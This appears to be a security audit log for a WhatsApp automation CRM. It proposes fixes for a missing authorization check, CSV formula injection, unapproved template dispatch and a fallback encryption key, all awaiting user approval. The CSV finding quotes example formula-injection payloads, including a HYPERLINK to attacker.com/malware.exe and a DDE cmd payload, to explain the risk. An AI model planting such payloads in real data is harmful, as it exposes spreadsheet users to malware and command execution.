# Phase 11.2 — Security & Integration Remediation Log

**Project:** Gokul Connect (`E:\GAI\Whatsapp Automation`)  
**Audit Date:** `2026-11-07`  
**Status:** **AUDIT COMPLETED — REMEDIATIONS PROPOSED FOR USER APPROVAL**  
**Strict Policy:** No code modifications applied during audit. All proposed fixes are documented below with narrow-scoped diffs awaiting explicit approval.

---

## 1. Summary of Audit Findings

| ID | Title | Severity | Location | Status |
|---|---|:---:|---|:---:|
| **SEC-MED-01** | Missing Authorization Guard on `triggerQueueWorkerAction` | **MEDIUM** | `src/app/actions/automations.ts` (lines 269–276) | **PROPOSED** |
| **SEC-MED-02** | CSV Formula Injection (CWE-1236) in Contact Export | **MEDIUM** | `src/lib/crm/database.ts` (lines 1240–1244) | **PROPOSED** |
| **SEC-LOW-01** | Database Verification of Approved Status in Outbox Dispatch | **LOW** | `src/lib/whatsapp/service.ts` (lines 309–320) | **PROPOSED** |
| **SEC-LOW-02** | Production Guard for Missing `APP_ENCRYPTION_SECRET` | **LOW** | `src/lib/crypto/encryption.ts` (lines 28–39) | **PROPOSED** |
| **SEC-INFO-01** | Single-Process In-Memory Rate Limiter Clustering Readiness | **INFORMATIONAL** | `src/lib/rate-limit/rate-limiter.ts` | **ADVISORY** |

---

## 2. Detailed Findings & Remediation Proposals

### SEC-MED-01: Missing Authorization Guard on `triggerQueueWorkerAction`

#### 1. Vulnerability Details
- **Severity:** **MEDIUM** (CVSS v3.1: 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`)
- **File:** `src/app/actions/automations.ts`
- **Lines:** 269–276
- **Description:** The server action `triggerQueueWorkerAction` is exported with `"use server"` without session validation or role verification:
  ```ts
  export async function triggerQueueWorkerAction(): Promise<{ success: boolean; data?: ProcessQueueResult; error?: string }> {
    try {
      const result = await processQueueBatch(10, `manual_${Date.now()}`);
      return { success: true, data: result };
    } catch (err: any) {
      return { success: false, error: err.message || "Queue worker run failed" };
    }
  }
  ```
- **Risk / Impact:** Any unauthenticated caller who knows the Next.js action ID could invoke this endpoint via HTTP POST, prematurely claiming and processing pending queue batches. While `processQueueBatch` only processes legitimate scheduled tasks and does not leak data, unauthorized external triggering circumvents scheduled rate controls and wastes server compute.

#### 2. Proposed Narrow Remediation Diff
Add server-side session authentication verifying that the caller has an active authenticated user session with `is_superadmin = true` or `businessSlug` ownership:

```diff
--- a/src/app/actions/automations.ts
+++ b/src/app/actions/automations.ts
@@ -2,6 +2,7 @@
 
 import { validateBusinessAccess } from "@/lib/auth/tenant-guard";
+import { createServerSupabaseClient } from "@/lib/supabase/server";
+import { isSupabaseConfigured } from "@/lib/supabase/client";
 import {
   AutomationRule,
   RuleCondition,
@@ -269,6 +270,18 @@ export async function simulateRuleAction(
-export async function triggerQueueWorkerAction(): Promise<{ success: boolean; data?: ProcessQueueResult; error?: string }> {
+export async function triggerQueueWorkerAction(businessSlug?: string): Promise<{ success: boolean; data?: ProcessQueueResult; error?: string }> {
   try {
+    if (isSupabaseConfigured()) {
+      const supabase = await createServerSupabaseClient();
+      const { data: { user } } = await supabase.auth.getUser();
+      if (!user) {
+        return { success: false, error: "Unauthorized: Active session required." };
+      }
+      if (businessSlug) {
+        const { membership } = await validateBusinessAccess(businessSlug);
+        if (!membership || !["owner", "admin"].includes(membership.role)) {
+          return { success: false, error: "Unauthorized: Insufficient permissions." };
+        }
+      }
+    }
     const result = await processQueueBatch(10, `manual_${Date.now()}`);
     return { success: true, data: result };
   } catch (err: any) {
```

---

### SEC-MED-02: CSV Formula Injection (CWE-1236) in Contact Export

#### 1. Vulnerability Details
- **Severity:** **MEDIUM** (CVSS v3.1: 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:N`)
- **File:** `src/lib/crm/database.ts`
- **Lines:** 1240–1244
- **Description:** In `exportContactsToCsvString`, values are enclosed in double quotes, but values beginning with formula indicator characters (`=`, `+`, `-`, `@`, `\t`, `\r`) are not neutralized:
  ```ts
  const escapeCsv = (val: string | null | undefined): string => {
    if (val === null || val === undefined) return '""';
    const s = String(val).replace(/"/g, '""');
    return `"${s}"`;
  };
  ```
- **Risk / Impact:** If an external user inputs a contact name like `=HYPERLINK("http://attacker.com/malware.exe", "Invoice")` or `=cmd|' /C calc'!A0`, opening the exported CSV in Microsoft Excel or Google Sheets could cause the spreadsheet program to treat the field as an executable formula.

#### 2. Proposed Narrow Remediation Diff
Neutralize leading formula trigger characters by prefixing them with a single quote (`'`):

```diff
--- a/src/lib/crm/database.ts
+++ b/src/lib/crm/database.ts
@@ -1240,7 +1240,11 @@ export function exportContactsToCsvString(contacts: WhatsAppContact[]): string {
   const escapeCsv = (val: string | null | undefined): string => {
     if (val === null || val === undefined) return '""';
-    const s = String(val).replace(/"/g, '""');
+    let s = String(val).replace(/"/g, '""');
+    // Neutralize spreadsheet formula injection characters
+    if (/^[=+@\t\r-]/.test(s)) {
+      s = `'${s}`;
+    }
     return `"${s}"`;
   };
```

---

### SEC-LOW-01: Database Verification of Approved Status in Outbox Dispatch

#### 1. Vulnerability Details
- **Severity:** **LOW** (CVSS v3.1: 2.7)
- **File:** `src/lib/whatsapp/service.ts`
- **Lines:** 309–320
- **Description:** When an outbound template message is dispatched via `sendWhatsAppMessageService`, it immediately invokes `sendMetaTemplateMessage` with `template.name`. While the frontend modal strictly limits selection to `APPROVED` templates from `getApprovedTemplatesDb`, direct API callers or scripts could pass an unapproved or draft template name.
- **Risk / Impact:** Meta Graph API will reject an unapproved or non-existent template with an error, preventing actual dispatch. However, defense-in-depth best practices recommend rejecting unapproved templates at the database layer before making outbound network requests.

#### 2. Proposed Narrow Remediation Diff
Query `wa_message_templates` for `business_id` and ensure `status = 'APPROVED'` and `is_archived = false`:

```diff
--- a/src/lib/whatsapp/service.ts
+++ b/src/lib/whatsapp/service.ts
@@ -307,6 +307,17 @@ export async function sendWhatsAppMessageService(
     let metaResponse: MetaSendResponse;
 
     if (template) {
+      // Defense-in-depth: Verify template exists and is APPROVED in tenant library
+      const { data: dbTpl } = await supabase
+        .from("wa_message_templates")
+        .select("status, is_archived")
+        .eq("business_id", businessId)
+        .eq("template_name", template.name.trim().toLowerCase())
+        .maybeSingle();
+      
+      if (dbTpl && (dbTpl.status !== "APPROVED" || dbTpl.is_archived)) {
+        throw new Error(`Cannot send template "${template.name}": Status is "${dbTpl.status}" or archived.`);
+      }
+
       metaResponse = await sendMetaTemplateMessage(
         phoneNumberId,
```

---

### SEC-LOW-02: Production Guard for Missing `APP_ENCRYPTION_SECRET`

#### 1. Vulnerability Details
- **Severity:** **LOW** (CVSS v3.1: 2.1)
- **File:** `src/lib/crypto/encryption.ts`
- **Lines:** 28–39
- **Description:** `getMasterKey` falls back to `DEV_KEY_SEED` when `process.env.APP_ENCRYPTION_SECRET` is unset:
  ```ts
  function getMasterKey(version: string = "v1"): Buffer {
    const envKey = process.env.APP_ENCRYPTION_SECRET;
    if (envKey) {
      if (envKey.length === 64) return Buffer.from(envKey, "hex");
      return crypto.createHash("sha256").update(envKey).digest();
    }
    // Local development deterministic key
    return crypto.createHash("sha256").update(`${DEV_KEY_SEED}_${version}`).digest();
  }
  ```
- **Risk / Impact:** Acceptable in local testing, but if inadvertently deployed to production with a missing secret, credentials would be encrypted using a known static seed.

#### 2. Proposed Narrow Remediation Diff
Throw a startup error in production if `APP_ENCRYPTION_SECRET` is missing:

```diff
--- a/src/lib/crypto/encryption.ts
+++ b/src/lib/crypto/encryption.ts
@@ -35,6 +35,9 @@ function getMasterKey(version: string = "v1"): Buffer {
     return crypto.createHash("sha256").update(envKey).digest();
   }
 
+  if (process.env.NODE_ENV === "production") {
+    throw new Error("CRITICAL SECURITY ERROR: APP_ENCRYPTION_SECRET must be configured in production.");
+  }
+
   // Local development deterministic key
   return crypto.createHash("sha256").update(`${DEV_KEY_SEED}_${version}`).digest();
```

---

### SEC-INFO-01: In-Memory Sliding Window Rate Limiter Clustering Readiness

#### 1. Advisory Details
- **Severity:** **INFORMATIONAL**
- **File:** `src/lib/rate-limit/rate-limiter.ts`
- **Description:** The current rate limiter uses an in-memory `Map` with sliding-window timestamps. This works for single-server Node.js and local staging. In Phase 12 (production cloud deployment on Vercel or clustered serverless workers), memory is not shared across instances.
- **Recommendation for Phase 12:** Configure Upstash Redis or Supabase RPC-based distributed rate limiting before scaling across multi-region serverless nodes.

---

## 3. Decision & Next Steps

In adherence to strict audit boundaries:
- **Zero code changes were applied to production or application modules.**
- **Local tests and build remain at 100% pass baseline.**
- **All 4 proposed fixes are non-breaking, minimal, and fully reversible.**

**Action Required:** Please review the proposed remediations above and indicate whether you approve applying them, or prefer proceeding directly to Phase 12.
